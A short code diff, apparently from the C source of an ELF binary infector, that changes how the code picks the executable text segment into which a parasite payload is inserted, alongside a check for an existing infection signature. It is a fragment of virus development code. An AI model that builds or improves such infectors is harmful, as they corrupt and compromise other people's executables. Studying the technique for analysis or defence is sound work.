@@ -258,7 +258,7 @@ void do_main()
             zeroes_size = after_re - end_of_text - parasite_size - SIGNATURE_SIZE;            
             break;
           }
-          if (p_hdr->p_type == PT_LOAD && (p_hdr->p_flags & PF_X) && !text_found)
+          if (p_hdr->p_type == PT_LOAD && p_hdr->p_flags == (PF_R | PF_X) && !text_found)
             {
               long signature = *((long*)&mem[p_hdr->p_offset + p_hdr->p_filesz - SIGNATURE_SIZE]);
               if (signature == SIGNATURE) goto signature_found;
